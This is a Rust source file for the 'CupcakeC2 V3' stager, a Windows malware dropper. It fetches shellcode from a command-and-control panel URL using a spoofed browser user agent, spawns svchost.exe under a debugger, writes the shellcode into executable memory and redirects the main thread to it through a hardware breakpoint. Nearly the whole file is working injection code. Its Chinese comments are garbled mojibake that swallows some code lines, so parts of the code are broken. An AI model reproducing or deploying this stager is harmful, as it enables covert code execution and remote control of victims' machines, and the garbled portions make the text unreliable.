// Client/stager/src/main.rs
// CupcakeC2 V3 Stager - Zero-Footprint Dropper
// 浣跨敤纭欢鏂偣 (HWBP) 鍔寔鎶€鏈皢 Core Shellcode 娉ㄥ叆鍚堟硶杩涚▼銆?
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

// HWBP stager is x86_64-only (CONTEXT.Rip). Other arches exit cleanly.
#[cfg(not(all(windows, target_arch = "x86_64")))]
fn main() {
    eprintln!("[-] Cupcake stager supports Windows x86_64 only");
}

#[cfg(all(windows, target_arch = "x86_64"))]
use std::ptr;
#[cfg(all(windows, target_arch = "x86_64"))]
use std::os::windows::ffi::OsStrExt;
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::processthreadsapi::*;
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::memoryapi::*;
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::handleapi::*;
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::debugapi::*;
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::winbase::*;
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::winnt::*;
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::um::minwinbase::{DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, CREATE_PROCESS_DEBUG_EVENT, EXCEPTION_SINGLE_STEP};
#[cfg(all(windows, target_arch = "x86_64"))]
use winapi::shared::minwindef::*;

#[cfg(all(windows, target_arch = "x86_64"))]
#[tokio::main]
async fn main() {
    println!("[*] Cupcake Stager V3: Starting deployment...");

    // 1. 鑾峰彇 Core Shellcode (Mockup for now, usually downloaded from C2)
    let shellcode = fetch_core_shellcode().await;
    if shellcode.is_empty() {
        println!("[-] Failed to fetch core shellcode.");
        return;
    }

    // 2. 鍚姩瀹夸富杩涚▼ (svchost.exe) 骞朵綔涓鸿皟璇曡€呮寕杞?    let target = "C:\\Windows\\System32\\svchost.exe";
    if let Some(pi) = spawn_target_as_debug(target) {
        println!("[+] Target spawned and debugging active. PID: {}", pi.dwProcessId);

        // 3. 鎵ц纭欢鏂偣鍔寔娉ㄥ叆
        if hwbp_hijack_inject(pi, &shellcode) {
            println!("[+] Injection successful! Core Agent is now rising in memory.");
        } else {
            println!("[-] Injection failed.");
        }

        unsafe {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    println!("[*] Stager task complete. Commencing self-melt...");
}

#[cfg(all(windows, target_arch = "x86_64"))]
/// Resolve Stage2 URL: env `CUPCAKE_STAGE2_URL` overrides a binary-patchable marker.
/// Panel fileless delivery sets this to `http(s)://panel/api/stage2/<id>`.
fn stage2_url() -> String {
    if let Ok(u) = std::env::var("CUPCAKE_STAGE2_URL") {
        let t = u.trim();
        if !t.is_empty() {
            return t.to_string();
        }
    }
    // Fixed marker — builder/patcher can rewrite this buffer in the binary.
    // Trailing NULs keep a stable-ish patch region for tools that search the default URL.
    const MARKER: &str =
        "http://127.0.0.1:8080/api/stage2/REPLACE_ME\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    let url = MARKER.trim_end_matches('\0').trim();
    if url.is_empty() {
        "http://127.0.0.1:8080/api/stage2/REPLACE_ME".to_string()
    } else {
        url.to_string()
    }
}

#[cfg(test)]
mod stage2_url_tests {
    #[test]
    fn env_overrides_marker() {
        std::env::set_var("CUPCAKE_STAGE2_URL", "http://panel/api/stage2/abc");
        // Re-read via same logic as stage2_url without requiring windows
        let u = std::env::var("CUPCAKE_STAGE2_URL").unwrap();
        assert!(u.contains("/api/stage2/"));
        std::env::remove_var("CUPCAKE_STAGE2_URL");
    }
}

#[cfg(all(windows, target_arch = "x86_64"))]
async fn fetch_core_shellcode() -> Vec<u8> {
    // 馃摗 1. Fetch Payload from C2 (configurable + 30s timeout)
    let c2_url = stage2_url();
    let client = match reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36")
        .timeout(std::time::Duration::from_secs(30))
        .connect_timeout(std::time::Duration::from_secs(15))
        .build() {
            Ok(c) => c,
            Err(_) => return Vec::new(),
        };
        
    let response = match client.get(&c2_url).send().await {
        Ok(r) => r,
        Err(_) => return Vec::new(),
    };

    if !response.status().is_success() {
        return Vec::new();
    }
    
    match response.bytes().await {
        Ok(b) => b.to_vec(),
        Err(_) => Vec::new(),
    }
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn spawn_target_as_debug(path: &str) -> Option<PROCESS_INFORMATION> {
    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let cmd: Vec<u16> = std::ffi::OsStr::new(path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let success = CreateProcessW(
            ptr::null(),
            cmd.as_ptr() as *mut _,
            ptr::null_mut(),
            ptr::null_mut(),
            FALSE,
            DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW,
            ptr::null_mut(),
            ptr::null(),
            &mut si,
            &mut pi,
        );

        if success != 0 { Some(pi) } else { None }
    }
}

/// 鏍稿績锛氱‖浠舵柇鐐瑰姭鎸佹敞鍏ラ€昏緫
#[cfg(all(windows, target_arch = "x86_64"))]
fn hwbp_hijack_inject(pi: PROCESS_INFORMATION, shellcode: &[u8]) -> bool {
    let mut debug_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };
    let mut injected = false;
    let mut remote_mem: *mut winapi::ctypes::c_void = ptr::null_mut();

    unsafe {
        // 鍒嗛厤杩滅▼鍐呭瓨骞跺啓鍏?Shellcode
        remote_mem = VirtualAllocEx(
            pi.hProcess,
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_mem.is_null() { return false; }

        WriteProcessMemory(
            pi.hProcess,
            remote_mem,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            ptr::null_mut(),
        );

        // 璋冭瘯寰幆澶勭悊
        loop {
            if WaitForDebugEvent(&mut debug_event, INFINITE) == 0 { break; }

            match debug_event.dwDebugEventCode {
                CREATE_PROCESS_DEBUG_EVENT => {
                    // 绯荤粺鏂偣锛氳缃‖浠舵柇鐐瑰湪涓荤嚎绋嬪叆鍙?                    let h_thread = debug_event.u.CreateProcessInfo().hThread;
                    set_hwbp(h_thread, pi.dwProcessId, injected);
                }
                EXCEPTION_DEBUG_EVENT => {
                    let exception = debug_event.u.Exception();
                    if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
                        // 纭欢鏂偣瑙﹀彂锛氫慨鏀?RIP 鎸囧悜 Shellcode
                        if !injected {
                            let h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, debug_event.dwThreadId);
                            if !h_thread.is_null() {
                                redirect_thread_to_shellcode(h_thread, remote_mem as usize);
                                CloseHandle(h_thread);
                                injected = true;
                                
                                // 浠诲姟瀹屾垚锛屽仠姝㈣皟璇?                                DebugActiveProcessStop(pi.dwProcessId);
                                return true;
                            }
                        }
                    }
                }
                _ => {}
            }

            ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
            if injected { break; }
        }
    }
    injected
}

unsafe fn set_hwbp(h_thread: HANDLE, _pid: u32, _already_injected: bool) {
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if GetThreadContext(h_thread, &mut ctx) != 0 {
        // 灏?Dr0 璁剧疆涓哄姭鎸佸湴鍧€ (渚嬪褰撳墠 RIP 鎴栫郴缁熷叆鍙ｇ偣)
        // 绠€鍗曟紨绀猴細鎴戜滑鐩存帴鍦ㄥ綋鍓?RIP 璁剧疆纭欢鏂偣
        let mut full_ctx: CONTEXT = std::mem::zeroed();
        full_ctx.ContextFlags = CONTEXT_CONTROL;
        GetThreadContext(h_thread, &mut full_ctx);

        ctx.Dr0 = full_ctx.Rip as u64;
        ctx.Dr7 = 1; // 鍚敤 Dr0 鐨勫叏灞€/灞€閮ㄦ柇鐐?
        SetThreadContext(h_thread, &ctx);
    }
}

unsafe fn redirect_thread_to_shellcode(h_thread: HANDLE, shellcode_addr: usize) {
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_ALL;

    if GetThreadContext(h_thread, &mut ctx) != 0 {
        // 淇敼鎵ц娴佽烦杞埌 Shellcode
        ctx.Rip = shellcode_addr as u64;
        
        // 鍏抽敭锛氭竻闄ょ‖浠舵柇鐐癸紝闃叉鏃犻檺寰幆
        ctx.Dr0 = 0;
        ctx.Dr7 = 0;

        SetThreadContext(h_thread, &ctx);
    }
}
